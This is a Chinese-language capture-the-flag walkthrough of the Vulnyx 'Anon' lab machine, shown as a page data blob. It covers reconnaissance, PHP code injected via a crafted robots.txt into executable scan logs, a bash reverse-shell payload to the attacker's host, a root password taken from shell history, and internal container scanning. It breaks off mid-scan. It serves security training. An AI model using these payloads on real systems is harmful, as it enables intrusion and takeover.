{"pageProps":{"postData":{"id":"VulnyxAnon","contentHtml":"<h1>Anon</h1>\n<blockquote>\n<p>Difficulty: <strong>Medium</strong></p>\n</blockquote>\n<h2>信息收集</h2>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Hero]\n└─<span class=\"hljs-comment\"># nmap -sP 192.168.56.0/24                  </span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 09:<span class=\"hljs-number\">16</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00046</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00049</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:1B:2E:A6 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:BA:F4:<span class=\"hljs-number\">75</span> (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Hero]\n└─<span class=\"hljs-comment\"># nmap -sT -min-rate 10000 -p- 192.168.56.19</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 09:<span class=\"hljs-number\">17</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00060</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:BA:F4:<span class=\"hljs-number\">75</span> (Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">17.61</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Hero]\n└─<span class=\"hljs-comment\"># nmap -sT -A -T4 -p 22,80 192.168.56.19     </span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 09:<span class=\"hljs-number\">18</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00062</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">9.2</span>p1 Debian <span class=\"hljs-number\">2</span>+deb12u4 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> a9:a8:<span class=\"hljs-number\">52</span>:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:<span class=\"hljs-number\">76</span>:b6 (ECDSA)\n|_  <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">73</span>:f5:8e:<span class=\"hljs-number\">44</span>:0c:b9:0a:e0:e7:<span class=\"hljs-number\">31</span>:0c:04:ac:7e:ff:fd (ED25519)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span> ((Debian))\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.62</span> (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:BA:F4:<span class=\"hljs-number\">75</span> (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.62</span> ms <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nmap -script=vuln -p 22,80 192.168.56.19</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( [https://nmap.org](https://nmap.org/) ) at <span class=\"hljs-number\">2025</span>-02-08 <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">33</span> EST\nStats: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">16</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">0</span> up), <span class=\"hljs-number\">0</span> undergoing Script Pre-Scan\nNSE Timing: About <span class=\"hljs-number\">50.00</span>% done; ETC: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">34</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">16</span> remaining)\nPre-scan script results:\n| broadcast-avahi-dos:\n|   Discovered hosts:\n|     <span class=\"hljs-number\">224.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.251</span>\n|   After NULL UDP avahi packet DoS (CVE-<span class=\"hljs-number\">2011</span>-<span class=\"hljs-number\">1002</span>).\n|_  Hosts are <span class=\"hljs-built_in\">all</span> up (<span class=\"hljs-keyword\">not</span> vulnerable).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00066</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\nMAC Address: 08:00:27:BA:F4:75 (Oracle VirtualBox virtual NIC)\n</span></code></pre>\n<p>优先级 <code>80</code> > <code>22</code></p>\n<h2>80 端口</h2>\n<p>访问主页，是默认页面</p>\n<p><img src=\"/post-images/VulnyxAnon/image.png\" alt=\"image.png\"></p>\n<p>没什么信息，扫描一下目录，扫描到<code>/Anonymous-Connections</code> 目录</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># gobuster dir -u http://192.168.56.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt</span>\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\n/server-status        (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\n/Anonymous-Connections (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">330</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>/Anonymous-Connections/]\nProgress: <span class=\"hljs-number\">661680</span> / <span class=\"hljs-number\">661683</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问，提示 输入目标<code>IP</code></p>\n<p><img src=\"/post-images/VulnyxAnon/image1.png\" alt=\"image.png\"></p>\n<p>经过测试，这里接入的是<code>nmap</code>的命令</p>\n<p><img src=\"/post-images/VulnyxAnon/image2.png\" alt=\"image.png\"></p>\n<p>尝试一下命令拼接 <code>127.0.0.1 | ls</code> ，会提示<code>Invalid IP.</code></p>\n<p><img src=\"/post-images/VulnyxAnon/image3.png\" alt=\"image.png\"></p>\n<p>尝试绕过但是没成功，基于扫描到的目录再去扫描一遍，扫描到新目录<code>victims</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─<span class=\"hljs-comment\"># gobuster dir -u http://192.168.56.19/Anonymous-Connections/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt</span>\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>/Anonymous-Connections/\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\n/index.php            (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">2426</span>]\n/victims              (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">338</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>/Anonymous-Connections/victims/]\n/.php                 (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">278</span>]\nProgress: <span class=\"hljs-number\">661680</span> / <span class=\"hljs-number\">661683</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>是存放扫描日志的目录</p>\n<p><img src=\"/post-images/VulnyxAnon/image4.png\" alt=\"image.png\"></p>\n<p>但是<code>nmap</code>会扫描<code>robots.txt</code>文件，我们在文件夹开启服务器后并编写一个<code>robots.txt</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># robots.txt</span>\nUser-agent: *\nDisallow: index.php\n</code></pre>\n<p>再扫描一下我们的<code>IP</code> ，可以看到它去访问了我们不存在<code>index.php</code>，并会将 <code>robots.txt</code> 的内容作为输出出现，然后会将内容写到日志里边去</p>\n<p><img src=\"/post-images/VulnyxAnon/image5.png\" alt=\"image.png\"></p>\n<p>我们将<code>Disallow</code> 改成可执行的代码，然后输入我们的<code>IP</code>然后<code>scan</code></p>\n<pre><code class=\"hljs language-python\">User-agent: *\nDisallow: &#x3C;?php phpinfo() ?>\n</code></pre>\n<p>然后访问日志目录，可以看到<code>phpinfo()</code>成功执行了（大概是服务器让<code>log</code>后缀能执行<code>php</code>代码）</p>\n<p><img src=\"/post-images/VulnyxAnon/image6.png\" alt=\"image.png\"></p>\n<h2>反弹shell</h2>\n<ol>\n<li>\n<p><code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nc -lvp 4444 -e /bin/sh                 </span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\n</code></pre>\n</li>\n<li>\n<p>在<code>robots.txt</code>文件里面写入反弹<code>shell</code>代码</p>\n<pre><code class=\"hljs language-python\">User-agent: *\nDisallow: &#x3C;?php <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.4/4444 0>&#x26;1'\"</span>);?>\n</code></pre>\n</li>\n<li>\n<p>点击<code>scan</code>后，去访问输出的日志，<code>kali</code>即可获得<code>shell</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nc -lvp 4444           </span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>: inverse host lookup failed: Host name lookup failure\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.19</span>] <span class=\"hljs-number\">58606</span>\nhacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ \n</code></pre>\n</li>\n</ol>\n<h2>靶机信息收集 - 1</h2>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1000</span>(hacktivist) gid=<span class=\"hljs-number\">1000</span>(hacktivist) groups=<span class=\"hljs-number\">1000</span>(hacktivist),<span class=\"hljs-number\">27</span>(sudo)\n\nhacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ ip add\nip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">5</span>: eth0@if6: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc noqueue state UP group default \n    link/ether 02:<span class=\"hljs-number\">42</span>:ac:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">00</span>:02 brd ff:ff:ff:ff:ff:ff link-netnsid <span class=\"hljs-number\">0</span>\n    inet <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2</span>/<span class=\"hljs-number\">16</span> brd <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth0\n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">9</span>: eth1@if10: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc noqueue state UP group default \n    link/ether 02:<span class=\"hljs-number\">42</span>:0a:0a:0a:0a brd ff:ff:ff:ff:ff:ff link-netnsid <span class=\"hljs-number\">0</span>\n    inet <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth1\n       valid_lft forever preferred_lft forever\n\nhacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ uname -a\nLinux debian1 <span class=\"hljs-number\">6.1</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">30</span>-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64 GNU/Linux</span>\n\n</code></pre>\n<p>在<code>history</code>中得到密码</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># history </span>\necho <span class=\"hljs-string\">'root:$uP3r_$3cUr3_D0ck3r'</span> | chpasswd\ncd\nnano .bash_history \n</code></pre>\n<p>环境是在<code>Docker</code>容器里</p>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/home/hacktivist$ ls -al /\nls -al /\ntotal <span class=\"hljs-number\">76</span>\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">48</span> .\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">48</span> ..\n-rwxr-xr-x   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">48</span> .dockerenv\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">7</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-built_in\">bin</span> -> usr/<span class=\"hljs-built_in\">bin</span>\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">31</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">25</span> boot\ndrwxr-xr-x   <span class=\"hljs-number\">5</span> root root  <span class=\"hljs-number\">360</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">13</span> dev\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">21</span>:02 etc\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">15</span>:07 home\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">7</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> lib -> usr/lib\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">9</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> lib64 -> usr/lib64\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> media\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> mnt\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> opt\ndr-xr-xr-x <span class=\"hljs-number\">146</span> root root    <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">13</span> proc\ndrwx------   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">15</span> root\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">42</span> run\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">8</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> sbin -> usr/sbin\ndrwxr-xr-x   <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> srv\ndr-xr-xr-x  <span class=\"hljs-number\">13</span> root root    <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">13</span> sys\ndrwxrwxrwt   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">13</span> tmp\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> usr\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">48</span> var\n</code></pre>\n<p>看到存在<code>.sudo_as_admin_successful</code> ，表示当用户首次成功使用 <code>sudo</code> 命令时，系统会在其家目录下创建此文件，那么该用户可能可以使用<code>sudo</code>来执行命令</p>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/home/hacktivist$ ls -al\ntotal <span class=\"hljs-number\">24</span>\ndrwxr-xr-x <span class=\"hljs-number\">2</span> hacktivist hacktivist <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">14</span> .\ndrwxr-xr-x <span class=\"hljs-number\">1</span> root       root       <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">15</span>:07 ..\n-rw------- <span class=\"hljs-number\">1</span> hacktivist hacktivist   <span class=\"hljs-number\">86</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">15</span> .bash_history\n-rw-r--r-- <span class=\"hljs-number\">1</span> hacktivist hacktivist  <span class=\"hljs-number\">220</span> Mar <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2024</span> .bash_logout\n-rw-r--r-- <span class=\"hljs-number\">1</span> hacktivist hacktivist <span class=\"hljs-number\">3526</span> Mar <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2024</span> .bashrc\n-rw-r--r-- <span class=\"hljs-number\">1</span> hacktivist hacktivist  <span class=\"hljs-number\">807</span> Mar <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2024</span> .profile\n-rw-r--r-- <span class=\"hljs-number\">1</span> hacktivist hacktivist    <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">52</span> .sudo_as_admin_successful\n</code></pre>\n<p>查看其权限，可以使用<code>sudo</code>执行任何命令</p>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/home/hacktivist$ sudo -l\nsudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> hacktivist on debian1:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>,\n    use_pty\n\nUser hacktivist may run the following commands on debian1:\n    (ALL : ALL) NOPASSWD: ALL\n</code></pre>\n<p>因为在外边可以使用<code>nmap</code> ，那么容器里应该也是可以的，我们可以使用它来扫描可用端口</p>\n<p>我们当前知道有<code>172.17.0.2</code> 和<code>10.10.10.10</code> ，其中<code>10.10.10.10</code>前边可能还存在有别的容器</p>\n<p>通过<code>nmap</code>来扫描主机，还存在另外一台机器<code>10.10.10.20</code></p>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo nmap -sP <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.0</span>/24sP <span class=\"hljs-number\">10.</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">44</span> UTC\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.000026</span>s latency).\nMAC Address: 02:<span class=\"hljs-number\">42</span>:0B:4E:D9:<span class=\"hljs-number\">36</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> debian2.private (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.000025</span>s latency).\nMAC Address: 02:<span class=\"hljs-number\">42</span>:0A:0A:0A:<span class=\"hljs-number\">14</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> debian1 (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>)\nHost <span class=\"hljs-keyword\">is</span> up.\nNmap done: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">3</span> hosts up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">14.85</span> seconds\n</code></pre>\n<p>扫描一下<code>10.10.10.20</code>机器的端口，发现<code>2222</code>端口</p>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo nmap -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>\nate <span class=\"hljs-number\">10000</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">50</span> UTC\nNmap scan report <span class=\"hljs-keyword\">for</span> debian2.private (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0000060</span>s latency).\nNot shown: <span class=\"hljs-number\">999</span> closed tcp ports (reset)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">2222</span>/tcp <span class=\"hljs-built_in\">open</span>  EtherNetIP-<span class=\"hljs-number\">1</span>\nMAC Address: 02:<span class=\"hljs-number\">42</span>:0A:0A:0A:<span class=\"hljs-number\">14</span> 